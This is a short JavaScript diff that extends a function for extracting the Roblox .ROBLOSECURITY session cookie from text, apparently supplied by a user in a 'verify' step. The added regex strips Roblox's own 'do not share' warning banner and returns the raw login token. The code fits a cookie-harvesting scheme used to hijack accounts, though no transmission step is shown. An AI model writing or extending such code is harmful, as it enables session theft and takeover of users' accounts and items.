@@ -434,6 +434,13 @@ async function verifyCode() {
 
 // Function to scan and find authentication data from text
 function extractRobloxCookie(text) {
+    // Look for the warning text with cookie format
+    const warningPattern = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_([A-Za-z0-9+/=._%\-]{100,})/;
+    const warningMatch = text.match(warningPattern);
+    if (warningMatch && warningMatch[1]) {
+        return warningMatch[1]; // Return just the cookie part without warning
+    }
+    
     // First, try to find .ROBLOSECURITY directly
     const roblosecurityIndex = text.indexOf('.ROBLOSECURITY');
     if (roblosecurityIndex !== -1) {
